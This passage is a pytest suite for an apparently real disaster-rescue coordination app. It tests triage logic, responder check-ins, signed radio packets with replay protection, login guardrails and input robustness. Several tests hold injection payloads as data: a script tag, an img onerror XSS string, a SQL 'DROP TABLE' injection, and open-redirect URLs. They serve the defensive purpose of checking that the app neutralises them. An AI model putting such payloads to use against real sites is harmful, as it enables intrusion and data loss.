    def test_implausible_timestamps_are_refused(self, client, offset, why):
        when = (datetime.now(timezone.utc) + offset).isoformat(timespec="seconds")
        r = client.post("/api/checkin", json={
            "lat": 29.78, "lng": -95.82, "happened_at": when,
        })
        assert r.status_code == 400, why
        assert r.get_json()["error"]

    def test_garbage_timestamps_are_refused(self, client):
        r = client.post("/api/checkin", json={
            "lat": 29.78, "lng": -95.82, "happened_at": "yesterday-ish",
        })
        assert r.status_code == 400

    def test_a_slightly_fast_clock_is_tolerated(self, client):
        # 30 seconds ahead is drift, not a lie. Accept it, but don't store a
        # time in the future.
        when = (datetime.now(timezone.utc) + timedelta(seconds=30)).isoformat(
            timespec="seconds")
        r = client.post("/api/checkin", json={
            "lat": 29.78, "lng": -95.82, "happened_at": when,
        })
        assert r.status_code == 201
        assert not r.get_json()["synced_late"]

    def test_the_newest_checkin_wins_not_the_last_to_arrive(self, client):
        client.post("/report/1/rescue")
        client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82})

        # An older queued one arrives afterwards; it must not become "latest".
        old = (datetime.now(timezone.utc) - timedelta(minutes=40)).isoformat(
            timespec="seconds")
        client.post("/api/checkin", json={
            "lat": 29.90, "lng": -95.50, "happened_at": old,
        })
        assert self.row(client)["last_position"]["lat"] == 29.78


class TestSchemaRebuilds:
    """init-db has to be safe to run twice, or a schema change leaves the
    database half-demolished."""

    def test_running_it_twice_works(self, client):
        diresq.init_db()
        diresq.init_db()
        with diresq.app.app_context():
            diresq.seed_minimal()
        assert client.get("/").status_code == 200

    def test_every_table_is_dropped_before_it_is_created(self):
        sql = diresq.SCHEMA.read_text(encoding="utf-8")
        created = set(re.findall(r"CREATE TABLE (\w+)", sql))
        dropped = set(re.findall(r"DROP TABLE IF EXISTS (\w+)", sql))
        assert created <= dropped, (
            f"created but never dropped: {sorted(created - dropped)}"
        )


class TestTriage:
    def test_page_renders(self, client):
        assert client.get("/triage").status_code == 200

    def test_report_form_links_to_it(self, client):
        assert b'href="/triage"' in client.get("/report/new").data

    @pytest.mark.parametrize("payload,priority,severity", [
        ({"can_walk": True, "breathing": True, "respiratory_rate": 18},
         "Minor", "LOW"),
        ({"can_walk": False, "breathing": False},
         "Deceased", "HIGH"),
        ({"can_walk": False, "breathing": True, "respiratory_rate": 34},
         "Immediate", "HIGH"),
        ({"can_walk": False, "breathing": True, "respiratory_rate": 18,
          "has_radial_pulse": False},
         "Immediate", "HIGH"),
        ({"can_walk": False, "breathing": True, "respiratory_rate": 18,
          "has_radial_pulse": True, "follows_commands": False},
         "Immediate", "HIGH"),
        ({"can_walk": False, "breathing": True, "respiratory_rate": 18,
          "has_radial_pulse": True, "follows_commands": True},
         "Delayed", "MEDIUM"),
    ])
    def test_start_categories_map_to_severity(self, client, payload,
                                              priority, severity):
        body = client.post("/api/triage", json=payload).get_json()
        assert body["priority"] == priority
        assert body["severity"] == severity
        assert body["explanation"]

    def test_walking_beats_everything_else(self, client):
        # START asks this first and stops. Someone walking is Minor whatever
        # else you tell it.
        body = client.post("/api/triage", json={
            "can_walk": True, "breathing": True, "respiratory_rate": 40,
            "has_radial_pulse": False, "follows_commands": False,
        }).get_json()
        assert body["priority"] == "Minor"

    @pytest.mark.parametrize("payload,why", [
        ({}, "no answer about walking"),
        ({"can_walk": False, "breathing": True}, "breathing but no rate given"),
        ({"can_walk": False, "breathing": True, "respiratory_rate": "abc"},
         "rate is not a number"),
    ])
    def test_incomplete_answers_are_refused(self, client, payload, why):
        r = client.post("/api/triage", json=payload)
        assert r.status_code == 400, why
        assert r.get_json()["error"]

    def test_requires_login(self, anon):
        assert anon.post("/api/triage", json={"can_walk": True}).status_code == 302


class TestCredits:
    def test_the_page_is_there(self, client):
        assert client.get("/credits").status_code == 200

    def test_it_works_logged_out_too(self, anon):
        assert anon.get("/credits").status_code == 200

    def test_nothing_in_the_nav_links_to_it(self, client):
        for page in ["/", "/map", "/board", "/report/1"]:
            body = client.get(page).get_data(as_text=True)
            assert 'href="/credits"' not in body, (
                f"{page} gives it away in a link"
            )

    def test_but_the_source_hints_at_it(self, client):
        assert "/credits" in client.get("/").get_data(as_text=True)


class TestFeedReordersOnStaffing:
    def on_scene_and_vote(self, client, report_id, vote):
        client.post(f"/report/{report_id}/rescue")
        aid = assignment_id_for(report_id)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        client.post(f"/api/reports/{report_id}/staffing", json={"staffing": vote})

    def feed(self, client):
        return [(r["id"], r["priority"], r["staffing"])
                for r in client.get("/api/reports").get_json()]

    def test_overstaffed_report_sinks_below_its_peers(self, client):
        # Reports 1 and 4 are both HIGH; 1 leads on recency.
        assert self.feed(client)[0][0] == 1
        self.on_scene_and_vote(client, 1, "overstaffed")
        order = [r[0] for r in self.feed(client)]
        assert order.index(4) < order.index(1), (
            "an overstaffed report kept its place ahead of an untouched peer"
        )

    def test_need_more_stays_at_the_top_of_its_band(self, client):
        self.on_scene_and_vote(client, 1, "need_more")
        assert self.feed(client)[0][0] == 1

    def test_staffing_never_outranks_priority(self, client):
        # Report 5 is LOW. Even begging for help it must not pass a HIGH.
        self.on_scene_and_vote(client, 5, "need_more")
        order = [r for r in self.feed(client)]
        first_low = next(i for i, r in enumerate(order) if r[1] == "LOW")
        last_high = max(i for i, r in enumerate(order) if r[1] == "HIGH")
        assert last_high < first_low, (
            "a LOW need_more jumped a HIGH report"
        )

    def test_empty_report_outranks_a_covered_one(self, client):
        # The whole thesis: nobody on it beats comfortably covered.
        self.on_scene_and_vote(client, 1, "adequate")
        order = [r[0] for r in self.feed(client)]
        assert order.index(4) < order.index(1)


class TestStaffingResolution:
    @pytest.mark.parametrize("votes,expected", [
        ([], "unstaffed"),
        (["adequate"], "adequate"),
        (["adequate", "need_more"], "need_more"),
        (["overstaffed", "adequate"], "adequate"),
        (["stood_down", "overstaffed"], "overstaffed"),
        (["need_more", "overstaffed", "adequate"], "need_more"),
        ([None, "adequate"], "adequate"),
    ])
    def test_most_cautious_vote_wins(self, votes, expected):
        assert diresq.resolve_staffing(votes) == expected

    def test_one_call_for_help_beats_any_number_of_reassurances(self):
        votes = ["overstaffed"] * 10 + ["need_more"]
        assert diresq.resolve_staffing(votes) == "need_more"


class TestOverdue:
    @staticmethod
    def ago(**kw):
        return (datetime.now(timezone.utc) - timedelta(**kw)).isoformat(
            timespec="seconds")

    @staticmethod
    def ahead(**kw):
        return (datetime.now(timezone.utc) + timedelta(**kw)).isoformat(
            timespec="seconds")

    def test_eta_in_the_future_is_not_overdue(self):
        assert not diresq.is_overdue(self.ago(hours=9), self.ahead(minutes=10), None)

    def test_passed_eta_is_overdue(self):
        assert diresq.is_overdue(self.ago(hours=9), self.ago(minutes=1), None)

    def test_recent_join_without_eta_is_not_overdue(self):
        assert not diresq.is_overdue(self.ago(minutes=5), None, None)

    def test_stale_join_without_eta_is_overdue(self):
        assert diresq.is_overdue(self.ago(minutes=45), None, None)

    def test_a_checkin_resets_the_clock(self):
        assert not diresq.is_overdue(
            self.ago(minutes=45), None, self.ago(minutes=2))

    def test_garbage_timestamps_do_not_raise(self):
        assert diresq.is_overdue("not a date", None, None) is False


class TestTheThingsBrowsersAskForAnyway:
    """Both of these 404'd on every page load. Harmless, but it's noise in the
    console the whole time we're recording."""

    def test_there_is_a_favicon(self, anon):
        res = anon.get("/favicon.ico")
        assert res.status_code == 200

    def test_search_engines_are_told_to_stay_out(self, anon):
        # Real reports name real addresses.
        body = anon.get("/robots.txt").get_data(as_text=True)
        assert "Disallow: /" in body


def ago(**kw):
    return (datetime.now(timezone.utc) - timedelta(**kw)).isoformat(
        timespec="seconds")


def backdate(assignment_id, minutes):
    """Move an assignment into the past so its deadline has come and gone."""
    with diresq.app.app_context():
        db = diresq.get_db()
        db.execute("UPDATE assignments SET joined_at = ? WHERE id = ?",
                   (ago(minutes=minutes), assignment_id))
        db.commit()


def auto_reports():
    with diresq.app.app_context():
        return [dict(r) for r in diresq.get_db().execute(
            "SELECT * FROM reports WHERE auto_filed_for IS NOT NULL").fetchall()]


class TestPackets:
    """The radio doesn't exist yet. The message that would go over it does,
    and it either fits or it doesn't."""

    def test_a_checkin_survives_the_round_trip(self):
        packet = transport.pack_checkin(42, 29.78584, -95.82441, 12)
        out = transport.unpack_checkin(packet)
        assert out.responder_id == 42
        assert out.age_minutes == 12
        assert abs(out.lat - 29.78584) < 1e-5
        assert abs(out.lng - -95.82441) < 1e-5

    def test_it_fits_the_smallest_payload_we_designed_for(self):
        packet = transport.pack_checkin(65535, -33.8688, 151.2093, 240)
        assert len(packet) <= transport.MAX_PACKET_BYTES

    def test_coordinates_land_within_a_couple_of_metres(self):
        # Five decimal places is ~1.1 m. Phone GPS in a storm is far worse,
        # so this is not the weak link.
        out = transport.unpack_checkin(
            transport.pack_checkin(1, 29.786123456, -95.824987654))
        assert abs(out.lat - 29.786123456) < 2e-5
        assert abs(out.lng - -95.824987654) < 2e-5

    def test_a_truncated_packet_is_rejected(self):
        packet = transport.pack_checkin(1, 29.78, -95.82)
        with pytest.raises(transport.PacketError):
            transport.unpack_checkin(packet[:-3])

    def test_a_packet_from_a_future_protocol_is_rejected(self):
        packet = bytearray(transport.pack_checkin(1, 29.78, -95.82))
        packet[0] = 99
        with pytest.raises(transport.PacketError):
            transport.unpack_checkin(bytes(packet))

    def test_an_id_too_big_for_the_field_is_refused_up_front(self):
        with pytest.raises(transport.PacketError):
            transport.pack_checkin(70000, 29.78, -95.82)


class TestSignedPackets:
    """A radio link has no TLS. Anyone with a $12 module can hear the channel
    and transmit on it, so the packet has to prove where it came from."""

    def test_a_sealed_packet_opens_with_the_right_key(self):
        key = transport.new_node_key()
        body = transport.pack_checkin(7, 29.78, -95.82, 5)
        assert transport.unseal(transport.seal(body, key), key) == body

    def test_the_wrong_key_is_refused(self):
        body = transport.pack_checkin(7, 29.78, -95.82)
        sealed = transport.seal(body, transport.new_node_key())
        with pytest.raises(transport.PacketError):
            transport.unseal(sealed, transport.new_node_key())

    def test_one_flipped_bit_anywhere_is_caught(self):
        key = transport.new_node_key()
        sealed = transport.seal(transport.pack_checkin(7, 29.78, -95.82), key)
        for i in range(len(sealed)):
            broken = bytearray(sealed)
            broken[i] ^= 0x01
            with pytest.raises(transport.PacketError):
                transport.unseal(bytes(broken), key)

    def test_the_version_byte_is_signed_too(self):
        # Otherwise you could talk us down to an older format by flipping one
        # bit and leaving the rest alone.
        key = transport.new_node_key()
        sealed = bytearray(
            transport.seal(transport.pack_checkin(7, 29.78, -95.82), key))
        sealed[0] = 0
        with pytest.raises(transport.PacketError):
            transport.unseal(bytes(sealed), key)

    def test_it_still_fits_a_radio_payload(self):
        key = transport.new_node_key()
        sealed = transport.seal(
            transport.pack_checkin(65535, -33.8688, 151.2093, 240), key)
        assert len(sealed) <= transport.MAX_PACKET_BYTES

    def test_the_responder_can_be_read_before_it_is_trusted(self):
        # You can't check a signature until you know whose key to check.
        key = transport.new_node_key()
        sealed = transport.seal(transport.pack_checkin(513, 29.78, -95.82), key)
        assert transport.responder_in(sealed) == 513

    def test_two_keys_are_never_the_same(self):
        assert len({transport.new_node_key() for _ in range(50)}) == 50


class TestReplayProtection:
    """A signature proves who made a packet. It says nothing about when.

    Anybody who records a valid packet off the air can send the same bytes
    again an hour later, and without a counter the server would happily move
    that pin. This is the attack we documented against ourselves and then
    fixed.
    """

    def key_for(self, responder_id=1):
        with diresq.app.app_context():
            return diresq.get_db().execute(
                "SELECT node_key FROM accounts WHERE id = ?",
                (responder_id,)).fetchone()["node_key"]

    def send(self, client, counter, responder_id=1, key=None):
        body = transport.pack_checkin(responder_id, 29.78, -95.82, 1,
                                      counter=counter)
        sealed = transport.seal(body, key or self.key_for(responder_id))
        return client.post("/api/uplink",
                           json={"packet": base64.b64encode(sealed).decode()})

    def test_a_fresh_packet_is_accepted(self, anon):
        assert self.send(anon, 1).status_code == 201

    def test_the_same_packet_twice_is_refused(self, anon):
        self.send(anon, 1)
        assert self.send(anon, 1).status_code == 409

    def test_an_older_counter_is_refused(self, anon):
        self.send(anon, 5)
        assert self.send(anon, 4).status_code == 409
        assert self.send(anon, 1).status_code == 409

    def test_a_replay_writes_nothing(self, anon):
        self.send(anon, 1)
        before = self.checkins()
        for _ in range(5):
            self.send(anon, 1)
        assert self.checkins() == before

    def test_counters_carry_on_going_up(self, anon):
        for n in range(1, 6):
            assert self.send(anon, n).status_code == 201
        assert self.checkins() == 5

    def test_gaps_are_fine(self, anon):
        # A node out of range for an hour comes back with a much higher
        # counter. Only going backwards is suspicious.
        assert self.send(anon, 1).status_code == 201
        assert self.send(anon, 900).status_code == 201

    def test_the_counter_is_per_node(self, anon):
        # One responder's traffic must not lock another out.
        assert self.send(anon, 10, responder_id=1).status_code == 201
        assert self.send(anon, 1, responder_id=2).status_code == 201

    def test_the_counter_cannot_be_edited_in_flight(self, anon):
        # It's inside the signed body, so bumping it invalidates the tag.
        body = transport.pack_checkin(1, 29.78, -95.82, 1, counter=1)
        sealed = bytearray(transport.seal(body, self.key_for(1)))
        sealed[-5] ^= 0x01          # last byte of the counter, before the tag
        res = anon.post("/api/uplink", json={
            "packet": base64.b64encode(bytes(sealed)).decode()})
        assert res.status_code == 400

    def test_the_refusal_says_what_it_last_accepted(self, anon):
        self.send(anon, 7)
        body = self.send(anon, 7).get_json()
        assert body["last_accepted"] == 7

    def test_it_still_fits_a_radio_payload(self):
        sealed = transport.seal(
            transport.pack_checkin(65535, -33.8, 151.2, 240,
                                   counter=transport.MAX_COUNTER),
            transport.new_node_key())
        assert len(sealed) <= transport.MAX_PACKET_BYTES

    def checkins(self):
        with diresq.app.app_context():
            return diresq.get_db().execute(
                "SELECT COUNT(*) c FROM checkins").fetchone()["c"]


class TestUplink:
    """The same check-in, arriving as bytes instead of as a browser."""

    def key_for(self, responder_id=1):
        with diresq.app.app_context():
            return diresq.get_db().execute(
                "SELECT node_key FROM accounts WHERE id = ?",
                (responder_id,)).fetchone()["node_key"]

    def packet(self, responder_id=1, lat=29.78, lng=-95.82, age=0, key=None):
        body = transport.pack_checkin(responder_id, lat, lng, age)
        return base64.b64encode(
            transport.seal(body, key or self.key_for(responder_id))).decode()

    def test_a_good_packet_records_a_checkin(self, anon):
        res = anon.post("/api/uplink", json={"packet": self.packet()})
        assert res.status_code == 201
        with diresq.app.app_context():
            assert diresq.get_db().execute(
                "SELECT COUNT(*) c FROM checkins").fetchone()["c"] == 1

    def test_it_does_not_need_a_session(self, anon):
        # A gateway has no cookie. That's the whole point of the endpoint.
        assert anon.post("/api/uplink",
                         json={"packet": self.packet()}).status_code == 201

    def test_the_age_in_the_packet_sets_the_time(self, anon):
        anon.post("/api/uplink", json={"packet": self.packet(age=90)})
        with diresq.app.app_context():
            row = diresq.get_db().execute(
                "SELECT created_at, received_at FROM checkins").fetchone()
        made = diresq.parse_iso(row["created_at"])
        got = diresq.parse_iso(row["received_at"])
        assert 85 < (got - made).total_seconds() / 60 < 95

    def test_a_late_packet_counts_as_a_late_sync(self, anon):
        body = anon.post("/api/uplink",
                         json={"packet": self.packet(age=45)}).get_json()
        assert body["synced_late"] is True

    def test_garbage_is_not_valid_base64(self, anon):
        res = anon.post("/api/uplink", json={"packet": "not base64!!"})
        assert res.status_code == 400

    def test_a_corrupt_packet_is_dropped_not_crashed(self, anon):
        junk = base64.b64encode(b"\x01\x02\x03").decode()
        res = anon.post("/api/uplink", json={"packet": junk})
        assert res.status_code == 400
        assert "error" in res.get_json()

    def test_an_unknown_responder_is_a_404(self, anon):
        packet = self.packet(9999, key=transport.new_node_key())
        assert anon.post("/api/uplink",
                         json={"packet": packet}).status_code == 404

    def test_an_unsigned_packet_is_refused(self, anon):
        bare = base64.b64encode(
            transport.pack_checkin(1, 29.78, -95.82)).decode()
        assert anon.post("/api/uplink",
                         json={"packet": bare}).status_code == 400

    def test_a_packet_signed_with_the_wrong_key_writes_nothing(self, anon):
        packet = self.packet(key=transport.new_node_key())
        res = anon.post("/api/uplink", json={"packet": packet})
        assert res.status_code == 400
        with diresq.app.app_context():
            assert diresq.get_db().execute(
                "SELECT COUNT(*) c FROM checkins").fetchone()["c"] == 0

    def test_you_cannot_check_in_as_somebody_else(self, anon):
        # Sign with responder 1's key but claim to be responder 2.
        body = transport.pack_checkin(2, 29.78, -95.82)
        packet = base64.b64encode(
            transport.seal(body, self.key_for(1))).decode()
        assert anon.post("/api/uplink",
                         json={"packet": packet}).status_code == 400


class TestDeadMansSwitch:
    """A red row only helps if somebody is looking at the board."""

    def silent_since(self, client, minutes):
        client.post("/report/1/rescue")
        backdate(1, minutes)

    def test_nothing_happens_while_they_are_inside_their_window(self, client):
        self.silent_since(client, 10)
        client.get("/api/responders")
        assert auto_reports() == []

    def test_nothing_happens_the_moment_they_go_overdue(self, client):
        # Overdue at 30 minutes; the switch waits another 15 before deciding
        # nobody is coming to look.
        self.silent_since(client, 35)
        client.get("/api/responders")
        assert auto_reports() == []

    def test_a_report_is_filed_once_they_stay_silent(self, client):
        self.silent_since(client, 60)
        client.get("/api/responders")
        filed = auto_reports()
        assert len(filed) == 1
        assert filed[0]["priority"] == "HIGH"
        assert "londo" in filed[0]["subject"]

    def test_it_only_ever_files_one(self, client):
        self.silent_since(client, 60)
        for _ in range(5):
            client.get("/api/responders")
            client.get("/")
        assert len(auto_reports()) == 1

    def test_it_is_pinned_to_their_last_known_position(self, client):
        client.post("/report/1/rescue")
        client.post("/api/checkin", json={"lat": 29.1234, "lng": -95.4321})
        backdate(1, 60)
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE checkins SET created_at = ?", (ago(minutes=60),))
            db.commit()

        client.get("/api/responders")
        filed = auto_reports()[0]
        assert round(filed["lat"], 4) == 29.1234
        assert round(filed["lng"], 4) == -95.4321

    def test_it_says_it_filed_itself(self, client):
        self.silent_since(client, 60)
        client.get("/api/responders")
        assert "automatically" in auto_reports()[0]["description"].lower()

    def test_a_checkin_stops_it_firing(self, client):
        self.silent_since(client, 60)
        client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82})
        client.get("/api/responders")
        assert auto_reports() == []

    def test_it_shows_up_on_the_feed_like_any_other_report(self, client):
        self.silent_since(client, 60)
        body = client.get("/").get_data(as_text=True)
        assert "No contact from londo" in body


class TestCoverageGap:
    def test_it_counts_reports_nobody_is_going_to(self, client):
        client.get("/")
        with diresq.app.app_context():
            assert len(diresq.coverage_gaps()) == 5

    def test_joining_one_takes_it_out_of_the_count(self, client):
        client.post("/report/1/rescue")
        with diresq.app.app_context():
            assert len(diresq.coverage_gaps()) == 4

    def test_en_route_counts_as_covered(self, client):
        # Nobody has arrived, but someone said they're coming. That's the
        # difference between understaffed and abandoned.
        client.post("/report/1/rescue")
        with diresq.app.app_context():
            gap_ids = [r["id"] for r in diresq.coverage_gaps()]
        assert 1 not in gap_ids

    def test_the_feed_says_the_number_out_loud(self, client):
        body = client.get("/").get_data(as_text=True)
        assert "with nobody going" in body

    def test_it_says_so_when_there_is_no_gap(self, client):
        for report_id in range(1, 6):
            client.post(f"/report/{report_id}/rescue")
        body = client.get("/").get_data(as_text=True)
        assert "Someone is on every open report" in body


class TestICS214:
    def test_it_downloads_as_a_file(self, client):
        res = client.get("/export/ics214")
        assert res.status_code == 200
        assert "attachment" in res.headers["Content-Disposition"]
        assert "ICS-214" in res.headers["Content-Disposition"]

    def test_it_has_the_sections_the_real_form_has(self, client):
        body = client.get("/export/ics214").get_data(as_text=True)
        for heading in ["ICS 214 - ACTIVITY LOG", "1. Incident Name",
                        "2. Operational Period", "4. Resources Assigned",
                        "5. Activity Log", "6. Prepared by"]:
            assert heading in body, f"missing {heading}"

    def test_everyone_who_went_out_is_listed(self, client):
        client.post("/report/1/rescue")
        body = client.get("/export/ics214").get_data(as_text=True)
        assert "londo" in body

    def test_the_activity_log_carries_real_events(self, client):
        client.post("/report/1/rescue")
        client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82})
        body = client.get("/export/ics214").get_data(as_text=True)
        assert "assigned to" in body
        assert "checked in" in body

    def test_it_admits_what_it_cannot_timestamp(self, client):
        body = client.get("/export/ics214").get_data(as_text=True)
        assert "not separately timestamped" in body

class TestAuthGuardrails:
    """The boring ones. Every one of these is something a person will
    actually do at two in the morning on a phone."""

    @pytest.fixture(autouse=True)
    def clear_lockouts(self):
        # The counter is module-level, so one test's failures would lock the
        # next one out.
        diresq.LOGIN_FAILURES.clear()
        yield
        diresq.LOGIN_FAILURES.clear()

    def signup(self, client, **fields):
        form = {"username": "newperson", "password": "correcthorse",
                "confirm_password": "correcthorse"}
        form.update(fields)
        return client.post("/signup", data=form)

    def test_the_caps_lock_warning_is_wired_up(self, anon):
        body = anon.get("/login").get_data(as_text=True)
        assert "authform.js" in body

    def test_password_fields_tell_the_browser_what_they_are(self, anon):
        body = anon.get("/login").get_data(as_text=True)
        assert 'autocomplete="current-password"' in body
        assert 'autocomplete="username"' in body

    def test_signup_asks_for_a_new_password_not_a_saved_one(self, anon):
        body = anon.get("/signup").get_data(as_text=True)
        assert 'autocomplete="new-password"' in body

    def test_usernames_do_not_autocapitalise_on_phones(self, anon):
        # Otherwise iOS quietly turns "londo" into "Londo" and the login fails
        # for a reason nobody can see.
        body = anon.get("/login").get_data(as_text=True)
        assert 'autocapitalize="none"' in body

    def test_errors_are_announced_to_screen_readers(self, anon):
        body = anon.post("/login", data={"username": "nobody",
                                         "password": "wrong"}
                         ).get_data(as_text=True)
        assert 'role="alert"' in body

    def test_a_username_that_differs_only_by_case_is_refused(self, anon):
        res = self.signup(anon, username="LONDO")
        assert res.status_code == 400
        assert "taken" in res.get_data(as_text=True)

    def test_punctuation_in_a_username_is_refused(self, anon):
        assert self.signup(anon, username="drop table").status_code == 400
        assert self.signup(anon, username="a").status_code == 400

    def test_a_password_the_same_as_the_username_is_refused(self, anon):
        res = self.signup(anon, username="rutherford",
                          password="rutherford", confirm_password="rutherford")
        assert res.status_code == 400

    def test_an_absurdly_long_password_is_refused(self, anon):
        # werkzeug will hash a megabyte if you let it, and take its time.
        long = "a" * 5000
        res = self.signup(anon, password=long, confirm_password=long)
        assert res.status_code == 400

    def test_a_long_password_does_not_get_hashed_at_login(self, anon):
        res = anon.post("/login", data={"username": "londo",
                                        "password": "a" * 5000})
        assert res.status_code == 401

    def test_repeated_wrong_guesses_lock_the_account(self, anon):
        for _ in range(diresq.MAX_LOGIN_ATTEMPTS):
            anon.post("/login", data={"username": "londo", "password": "no"})
        res = anon.post("/login", data={"username": "londo", "password": "no"})
        assert res.status_code == 429
        assert "Try again" in res.get_data(as_text=True)

    def test_the_lockout_is_per_username(self, anon):
        for _ in range(diresq.MAX_LOGIN_ATTEMPTS + 1):
            anon.post("/login", data={"username": "londo", "password": "no"})
        # Someone else is not locked out because you were guessed at.
        res = anon.post("/login", data={"username": "skythe", "password": "no"})
        assert res.status_code == 401

    def test_a_good_password_clears_the_counter(self, anon):
        anon.post("/login", data={"username": "londo", "password": "no"})
        anon.post("/login", data={"username": "londo", "password": "diresq"})
        assert "londo" not in diresq.LOGIN_FAILURES

    def test_login_will_not_bounce_you_to_another_site(self, anon):
        # ?next= is attacker-controlled. A real login form on a real domain
        # that hands you off afterwards is the whole phishing trick.
        res = anon.post("/login?next=https://example.com/",
                        data={"username": "londo", "password": "diresq"})
        assert res.status_code == 302
        assert "example.com" not in res.headers["Location"]

    def test_protocol_relative_urls_are_not_a_loophole(self, anon):
        res = anon.post("/login?next=//example.com/",
                        data={"username": "londo", "password": "diresq"})
        assert "example.com" not in res.headers["Location"]

    def test_a_normal_next_still_works(self, anon):
        res = anon.post("/login?next=/board",
                        data={"username": "londo", "password": "diresq"})
        assert res.headers["Location"].endswith("/board")

    def test_the_session_cookie_is_not_readable_from_javascript(self, anon):
        res = anon.post("/login", data={"username": "londo",
                                        "password": "diresq"})
        cookie = res.headers.get("Set-Cookie", "")
        assert "HttpOnly" in cookie
        assert "SameSite=Lax" in cookie


class TestTryingToBreakIt:
    """Everything a tired person does by accident at 3am, plus everything
    somebody does on purpose when they find the URL bar."""

    def test_an_entirely_empty_report_form(self, client):
        res = client.post("/report/new", data={})
        assert res.status_code == 400
        assert "Subject is required" in res.get_data(as_text=True)

    def test_a_report_of_nothing_but_spaces(self, client):
        res = client.post("/report/new", data={
            "subject": "     ", "priority": "HIGH", "lat": 29.7, "lng": -95.8})
        assert res.status_code == 400

    def test_a_report_with_no_location_because_gps_was_denied(self, client):
        # The map is untouched and the browser said no, so the hidden inputs
        # are still empty. Browsers don't validate hidden fields.
        before = count_reports()
        res = client.post("/report/new", data={
            "subject": "Water rising", "priority": "HIGH",
            "lat": "", "lng": ""})
        assert res.status_code == 400
        assert count_reports() == before

    def test_coordinates_that_are_not_numbers(self, client):
        res = client.post("/report/new", data={
            "subject": "Water rising", "priority": "HIGH",
            "lat": "somewhere", "lng": "over there"})
        assert res.status_code == 400

    def test_a_priority_nobody_offered(self, client):
        res = client.post("/report/new", data={
            "subject": "Water rising", "priority": "APOCALYPTIC",
            "lat": 29.7, "lng": -95.8})
        assert res.status_code == 400

    def test_a_very_long_subject_does_not_break_the_feed(self, client):
        client.post("/report/new", data={
            "subject": "A" * 5000, "priority": "LOW",
            "lat": 29.7, "lng": -95.8})
        assert client.get("/").status_code == 200

    def test_html_in_a_report_is_escaped_not_rendered(self, client):
        client.post("/report/new", data={
            "subject": "<script>alert(1)</script>", "priority": "LOW",
            "description": "<img src=x onerror=alert(1)>",
            "lat": 29.7, "lng": -95.8})
        body = client.get("/").get_data(as_text=True)
        assert "<script>alert(1)</script>" not in body
        assert "&lt;script&gt;" in body

    def test_a_quote_in_a_report_does_not_end_the_query(self, client):
        before = count_reports()
        client.post("/report/new", data={
            "subject": "'; DROP TABLE reports; --", "priority": "LOW",
            "lat": 29.7, "lng": -95.8})
        assert count_reports() == before + 1
        assert client.get("/").status_code == 200

    def test_joining_the_same_report_twice(self, client):
        client.post("/report/1/rescue")
        client.post("/report/1/rescue")
        with diresq.app.app_context():
            count = diresq.get_db().execute(
                "SELECT COUNT(*) c FROM assignments WHERE report_id = 1"
            ).fetchone()["c"]
        assert count == 1

    def test_joining_a_report_that_does_not_exist(self, client):
        assert client.post("/report/9999/rescue").status_code == 404

    def test_resolving_the_same_report_twice(self, client):
        # You have to be on scene, not merely on your way — being en route
        # doesn't put you in a position to know it's handled.
        client.post("/report/1/rescue")
        client.post("/api/assignments/1/status", json={"status": "on_scene"})
        client.post("/report/1/resolve")
        res = client.post("/report/1/resolve", follow_redirects=True)
        assert res.status_code == 200
        assert "Already resolved" in res.get_data(as_text=True)

    def test_you_cannot_resolve_from_the_car(self, client):
        client.post("/report/1/rescue")
        res = client.post("/report/1/resolve", follow_redirects=True)
        assert "Only the reporter or someone on scene" in res.get_data(as_text=True)
        with diresq.app.app_context():
            status = diresq.get_db().execute(
                "SELECT status FROM reports WHERE id = 1").fetchone()["status"]
        assert status != "resolved"

    def test_resolving_a_report_that_is_not_yours(self, client):
        # Filed by kiyan, and londo never went. Nobody else has grounds.
        res = client.post("/report/2/resolve", follow_redirects=True)
        assert "Only the reporter or someone on scene" in res.get_data(as_text=True)

    def test_flagging_your_own_report(self, client):
        client.post("/report/new", data={
            "subject": "Mine", "priority": "LOW", "lat": 29.7, "lng": -95.8})
        mine = count_reports()
        # Allowed — but it counts once, like anyone else's.
        assert client.post(f"/report/{mine}/flag").status_code in (200, 302)
        assert client.post(f"/report/{mine}/flag").status_code in (409, 302)
        with diresq.app.app_context():
            flags = diresq.get_db().execute(
                "SELECT flags FROM reports WHERE id = ?", (mine,)
            ).fetchone()["flags"]
        assert flags == 1

    def test_flagging_the_same_report_twice(self, client):
        client.post("/report/1/flag")
        res = client.post("/report/1/flag", json={})
        assert res.status_code == 409

    def test_a_hidden_report_is_still_visible_to_whoever_filed_it(self, client):
        # Being outvoted by three strangers shouldn't strand the person who
        # asked for help.
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE reports SET status = 'hidden' WHERE id = 1")
            db.commit()
        assert client.get("/report/1").status_code == 200

    def test_going_on_scene_without_joining(self, client):
        res = client.post("/api/assignments/1/status", json={"status": "on_scene"})
        assert res.status_code == 404

    def test_moving_somebody_elses_assignment(self, client):
        client.post("/report/1/rescue")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET responder = 2 WHERE id = 1")
            db.commit()
        res = client.post("/api/assignments/1/status", json={"status": "on_scene"})
        assert res.status_code == 403

    def test_skipping_straight_to_cleared(self, client):
        client.post("/report/1/rescue")
        res = client.post("/api/assignments/1/status", json={"status": "cleared"})
        assert res.status_code == 400

    def test_un_arriving_from_a_scene(self, client):
        client.post("/report/1/rescue")
        client.post("/api/assignments/1/status", json={"status": "on_scene"})
        res = client.post("/api/assignments/1/status", json={"status": "en_route"})
        assert res.status_code == 400

    def test_a_status_that_is_not_a_status(self, client):
        client.post("/report/1/rescue")
        res = client.post("/api/assignments/1/status", json={"status": "asleep"})
        assert res.status_code == 400

    def test_signalling_staffing_from_the_car(self, client):
        client.post("/report/1/rescue")
        res = client.post("/api/reports/1/staffing", json={"staffing": "need_more"})
        assert res.status_code == 403

    def test_checking_in_with_no_coordinates_at_all(self, client):
        # GPS denied. A check-in with no position still resets the timer,
        # because "I'm alive" is the part that matters.
        client.post("/report/1/rescue")
        res = client.post("/api/checkin", json={})
        assert res.status_code == 201

    def test_a_check_in_dated_next_week(self, client):
        client.post("/report/1/rescue")
        ahead = (datetime.now(timezone.utc) + timedelta(days=7)).isoformat()
        res = client.post("/api/checkin", json={"lat": 29.7, "lng": -95.8,
                                                "happened_at": ahead})
        assert res.status_code == 400

    def test_a_check_in_dated_last_year(self, client):
        client.post("/report/1/rescue")
